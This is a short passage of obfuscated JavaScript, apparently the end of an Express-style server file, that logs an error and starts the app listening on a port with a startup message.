_0x200423=_0x10ab1b;console[_0x200423(0x1cc)](_0x200423(0x279),_0x1ef3c4);}),app[_0x10ab1b(0x277)](PORT,()=>console[_0x10ab1b(0x274)](_0x10ab1b(0x20d)+PORT+'!'));
